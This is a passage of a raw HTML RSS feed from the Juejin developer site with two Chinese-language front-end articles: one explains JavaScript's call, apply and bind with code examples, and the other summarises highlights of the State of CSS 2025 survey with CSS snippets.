<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a656964f3c8472e8133493c0ed0cf1a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=J8IKCghTTyrkOcFyxYnZVpBftDE%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[面试官 : “ 请你说一下 call、apply、bind 的区别 ? ”]]></title>    <link>https://juejin.cn/post/7597009443084337167</link>    <guid>https://juejin.cn/post/7597009443084337167</guid>    <pubDate>2026-01-20T03:26:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597009443084337167" data-draft-id="7597009443084222479" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="面试官 : “ 请你说一下 call、apply、bind 的区别 ? ”"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-01-20T03:26:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="千寻girling"/> <meta itemprop="url" content="https://juejin.cn/user/2276467567770442"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            面试官 : “ 请你说一下 call、apply、bind 的区别 ? ”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2276467567770442/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    千寻girling
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:26:42.000Z" title="Tue Jan 20 2026 03:26:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">call、apply、bind 的核心区别</h3>
<p>这三个方法的作用都是<strong>改变函数的 <code>this</code> 指向</strong>，他们三个的第一个参数是要绑定给函数的 <code>this</code> 对象。但在传参方式和执行时机上有明显不同。</p>
<hr/>
<h3 data-id="heading-1">详细对比</h3>





























<table><thead><tr><th>特性</th><th><code>call</code></th><th><code>apply</code></th><th><code>bind</code></th></tr></thead><tbody><tr><td><strong><code>this</code> 绑定后是否立即执行</strong></td><td>立即执行</td><td>立即执行</td><td>返回一个新函数，需手动调用才执行</td></tr><tr><td><strong>传参方式</strong></td><td>逐个传递参数</td><td>以数组形式传递参数</td><td>预先传递部分参数（柯里化），剩余参数在调用时传递</td></tr><tr><td><strong>返回值</strong></td><td>函数执行结果</td><td>函数执行结果</td><td>新的绑定函数</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-2">代码示例</h3>
<h4 data-id="heading-3">1. call 用法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.greeting}</span>, <span class="hljs-subst">${name}</span>!`</span>);
}

<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">greeting</span>: <span class="hljs-string">'Hello'</span> };
greet.<span class="hljs-title function_">call</span>(obj, <span class="hljs-string">'Alice'</span>); <span class="hljs-comment">// 输出：Hello, Alice!</span>
</code></pre>
<h4 data-id="heading-4">2. apply 用法</h4>
<pre><code class="hljs language-ini" lang="ini">function sum(a, b) {
  return a + b<span class="hljs-comment">;</span>
}

const <span class="hljs-attr">numbers</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]<span class="hljs-comment">;</span>
const <span class="hljs-attr">result</span> = sum.apply(null, numbers)<span class="hljs-comment">; // 输出：3</span>
</code></pre>
<h4 data-id="heading-5">3. bind 用法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.greeting}</span>, <span class="hljs-subst">${name}</span>!`</span>);
}

<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">greeting</span>: <span class="hljs-string">'Hi'</span> };
<span class="hljs-keyword">const</span> boundGreet = greet.<span class="hljs-title function_">bind</span>(obj);
<span class="hljs-title function_">boundGreet</span>(<span class="hljs-string">'Bob'</span>); <span class="hljs-comment">// 输出：Hi, Bob!</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">核心场景</h3>
<ul>
<li><strong><code>call</code></strong>：适合参数数量明确的场景，如继承、借用方法。</li>
<li><strong><code>apply</code></strong>：适合参数数量不确定或已存在数组的场景，如数组求最大值 <code>Math.max.apply(null, [1, 2, 3])</code>。</li>
<li><strong><code>bind</code></strong>：适合需要延迟执行或预先绑定 <code>this</code> 的场景，如事件回调、定时器。</li>
</ul>
<p>这三个方法的作用都是<strong>改变函数的 <code>this</code> 指向</strong>，call , apply , bind 他们三个的第一个参数是要绑定给函数的 <code>this</code> 对象。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 年 CSS 年度调查报告亮点速览]]></title>    <link>https://juejin.cn/post/7596943803934670888</link>    <guid>https://juejin.cn/post/7596943803934670888</guid>    <pubDate>2026-01-20T03:04:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596943803934670888" data-draft-id="7596943803934621736" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 2025 年 CSS 年度调查报告亮点速览"/> <meta itemprop="keywords" content="前端,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-20T03:04:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             2025 年 CSS 年度调查报告亮点速览
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:04:01.000Z" title="Tue Jan 20 2026 03:04:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近日，「State of CSS 2025」年度调查报告公布。</p>
<p>这份报告收集了全球数万名开发者的真实使用经验和反馈，堪称是 Web 开发领域的“年度风向标”。</p>
<p>本篇我们盘点下这份报告的亮点部分。</p>
<h2 data-id="heading-0">1. 使用率最高的功能是 :has()</h2>
<p><strong>在调查的所有功能中，</strong><code>**:has()**</code><strong>是使用率最高也是最受欢迎的功能。</strong></p>
<p>想必大家已经很熟悉了，它是一个功能非常强大的伪类，可以实现类似“父选择器”和“前面兄弟选择器”的功能。</p>
<p>举个简单的例子，下面的 CSS 代码表示如果 <code>&lt;a&gt;</code> 元素里面有 <code>&lt;img&gt;</code> 元素，则这个 <code>&lt;a&gt;</code> 元素就会匹配。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">img</span>) {
  <span class="hljs-attribute">display</span>: block;
}
</code></pre>
<p>我们可以使用这个选择器轻松区分是文字链接还是图像链接，并设置不同的 CSS 样式。</p>
<h2 data-id="heading-1">2. 使用率第二高的功能是 aspect-ratio</h2>
<p>这个 CSS 属性允许你定义元素盒子的宽高比。</p>
<p>这意味着即使父容器或视口大小发生变化，浏览器也会调整元素的尺寸以保持指定的宽高比。</p>
<p>比如我们将一张图片设置为 3/2 宽高比：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">img</span> {
  aspect-ratio: <span class="hljs-number">3</span>/<span class="hljs-number">2</span>;
}
</code></pre>
<h2 data-id="heading-2">3. 使用率最低的是 sibling-count 和 sibling-index</h2>
<p>记得以前实现列表项交错动画时，要手动给每个元素设置不同的延迟吗？</p>
<p>现在，用 <code>sibling-index()</code> 一行代码就能搞定！</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">li</span> {
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span> ease;
  <span class="hljs-attribute">transition-delay</span>: <span class="hljs-built_in">calc</span>((<span class="hljs-built_in">sibling-index</span>() - <span class="hljs-number">1</span>) * <span class="hljs-number">100ms</span>);
}
</code></pre>
<p>这个函数会自动获取元素在兄弟节点中的位置（从 1 开始计数），通过简单的计算就能实现<strong>流畅的交错动画效果</strong>。</p>
<p>如果再搭配 <code>@starting-style</code>，连入场动画都能轻松搞定：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">li</span> {
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span> ease;
  <span class="hljs-attribute">transition-delay</span>: <span class="hljs-built_in">calc</span>((<span class="hljs-built_in">sibling-index</span>() - <span class="hljs-number">1</span>) * <span class="hljs-number">100ms</span>);

  <span class="hljs-keyword">@starting-style</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  }
}
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodepen.io%2Fargyleink%2Fpen%2FKwKXPYW" target="_blank" title="https://codepen.io/argyleink/pen/KwKXPYW" ref="nofollow noopener noreferrer">实现效果如下：</a></p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f1a4f0f145d4232a37913f620cc868d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=87sNHhi%2BWbIxUaBheGB0pwLtcRo%3D" alt="" loading="lazy"/></p>
<p>之所以使用率最低，可以理解，因为浏览器支持还比较新。</p>
<h2 data-id="heading-3">4. 受欢迎程度第二高的功能是 Subgrid</h2>
<p>Subgrid 表示子网格，它并不是一个 CSS 属性，而是 grid-template-columns 和 grid-template-rows 属性支持的关键字，其使用的场景需要外面已经有个 Grid 布局。</p>
<p>什么时候会用到 Subgrid 呢？</p>
<p>举个例子，这是一个布局效果：</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6e8b08e65a24a0f8a6f1db19000aab2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=iz0TkuOpABZCRaF5VU%2BjAYWKrkg%3D" alt="" loading="lazy"/></p>
<p>你会发现，标题字数不一样，内容字数不一样，导致底部很难对齐。</p>
<p>然而我们想要的效果是这样的：</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b50ee87a778a445e909c74b315cf7cc7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=n9xK2PPEkRShrOPWMdjSqgZEY%2FU%3D" alt="" loading="lazy"/></p>
<p>此时就可以用到 Subgrid，使用示例如下：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.wrapper</span> {
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}

<span class="hljs-selector-class">.item</span> {
  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">1</span> / <span class="hljs-number">4</span>;
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-rows</span>: subgrid;
}
</code></pre>
<h2 data-id="heading-4">5. 认知度增长最高的是 light-dark()</h2>
<p>不知道你是否实现过网站的浅色和深色主题：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-comment">/* 默认浅色主题 */</span>
  <span class="hljs-attr">--text-heading</span>: <span class="hljs-number">#000</span>;
  <span class="hljs-attr">--text-body</span>: <span class="hljs-number">#212121</span>;
  <span class="hljs-attr">--surface</span>: <span class="hljs-number">#efefef</span>;

  <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">prefers-color-scheme</span>: dark) {
    <span class="hljs-comment">/* 暗色主题 - 第一遍 */</span>
    <span class="hljs-attr">--text-heading</span>: <span class="hljs-number">#fff</span>;
    <span class="hljs-attr">--text-body</span>: <span class="hljs-number">#efefef</span>;
    <span class="hljs-attr">--surface</span>: <span class="hljs-number">#212121</span>;
  }
}

<span class="hljs-selector-class">.dark-theme</span> {
  <span class="hljs-comment">/* 暗色主题 - 又写一遍！ */</span>
  <span class="hljs-attr">--text-heading</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attr">--text-body</span>: <span class="hljs-number">#efefef</span>;
  <span class="hljs-attr">--surface</span>: <span class="hljs-number">#212121</span>;
}
</code></pre>
<p>同样的颜色写两遍，一个给媒体查询（自动切换），一个给切换按钮。</p>
<p>改一次要改两个地方，烦死了！</p>
<p>现在使用 <code>light-dark()</code> 轻松实现！</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-comment">/* 跟随系统偏好 */</span>
  <span class="hljs-attribute">color</span>-scheme: light dark;

  <span class="hljs-comment">/* 一次定义，自动切换 */</span>
  <span class="hljs-attr">--text-heading</span>: <span class="hljs-built_in">light-dark</span>(<span class="hljs-number">#000</span>, <span class="hljs-number">#fff</span>);
  <span class="hljs-attr">--text-body</span>: <span class="hljs-built_in">light-dark</span>(<span class="hljs-number">#212121</span>, <span class="hljs-number">#efefef</span>);
  <span class="hljs-attr">--surface</span>: <span class="hljs-built_in">light-dark</span>(<span class="hljs-number">#efefef</span>, <span class="hljs-number">#212121</span>);
}
</code></pre>
<p>就这么简单！系统是浅色就用第一个，暗色就用第二个。</p>
<h2 data-id="heading-5">6. 评论最多的功能是 line-clamp，多是负面评价</h2>
<p>CSS 属性 line-clamp 用于将容器的内容限制为指定的行数，也就是我们常实现的内容多时显示省略号的效果。</p>
<p>举个例子：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">p</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">display</span>: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: <span class="hljs-number">2</span>;
  <span class="hljs-attribute">overflow</span>: hidden;
}
</code></pre>
<p>效果如下：</p>

